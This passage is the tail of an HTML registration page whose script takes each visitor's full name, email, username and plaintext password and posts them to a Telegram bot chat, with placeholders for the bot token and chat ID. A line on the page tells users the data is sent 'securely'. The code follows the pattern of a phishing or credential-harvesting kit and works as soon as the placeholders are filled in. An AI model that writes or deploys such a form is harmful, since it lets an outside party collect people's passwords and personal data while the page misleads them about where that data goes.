        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit">Register</button>
    </form>
    <p class="note">Data will be sent securely to our Telegram bot.</p>
  </div>

  <script>
    document.getElementById("regForm").addEventListener("submit", function(e){
      e.preventDefault();

      // Replace with your Bot Token & Chat ID
      const botToken = "YOUR_BOT_TOKEN_HERE";
      const chatId = "YOUR_CHAT_ID_HERE";

      const fullname = document.getElementById("fullname").value;
      const email = document.getElementById("email").value;
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const message = `üìù New Registration:\n\nüë§ Name: ${fullname}\nüìß Email: ${email}\nüíª Username: ${username}\nüîë Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML"
        })
      })
      .then(res => res.json())
      .then(data => {
        if(data.ok){
          alert("‚úÖ Registration sent to Telegram!");
          document.getElementById("regForm").reset();
        } else {
          alert("‚ùå Error sending data.");
        }
      })
      .catch(err => {
        alert("‚ö†Ô∏è Network error.");
        console.error(err);
      });
    });
  </script>
